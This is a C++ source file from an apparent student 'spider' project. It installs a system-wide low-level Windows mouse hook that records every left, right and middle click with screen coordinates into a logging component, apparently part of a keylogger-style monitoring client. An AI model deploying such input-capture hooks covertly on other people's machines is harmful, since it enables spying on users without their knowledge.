/*
** MouseListener.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/MouseListener.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:14:46 2017 Gauthier Cler
** Last update Sun Oct 08 22:14:46 2017 Gauthier Cler
*/

#include <fstream>
#include <windowsx.h>
#include <sstream>
#include "MouseListener.hpp"
#include "Data.hpp"


Client::MouseListener::MouseListener() {

}

Client::MouseListener::~MouseListener() {

}

__declspec(dllexport) LRESULT CALLBACK mouseHook(int code, WPARAM Wparam, LPARAM Lparam) {

	if (code == HC_ACTION) {
		MSLLHOOKSTRUCT *mouseData;
		std::stringstream clickData;

		mouseData = (MSLLHOOKSTRUCT *) Lparam;
		if (Wparam == WM_LBUTTONDOWN || Wparam == WM_RBUTTONDOWN) {
			clickData << (Wparam == WM_LBUTTONDOWN ? "LC" : "RC") << " " << mouseData->pt.x << " "
					  << mouseData->pt.y;
		} else if (Wparam == WM_MBUTTONDOWN) {
			clickData << "MC" << " " << mouseData->pt.x << " " << mouseData->pt.y;
		}

		if (clickData.str().length()) {
			Client::Data::get().logData(clickData.str(), Client::Data::DataType::MOUSE);
		}
	}

	return CallNextHookEx(nullptr, code, Wparam, Lparam);
}

void Client::MouseListener::createHook(HINSTANCE const &moduleHandle) {
	if (!(_hook = SetWindowsHookEx(WH_MOUSE_LL, mouseHook, moduleHandle, NULL))) {
		throw Spider::Error("Keyboard Hook Crash");
	}
}

void Client::MouseListener::removeHook() {
	UnhookWindowsHookEx(_hook);
}
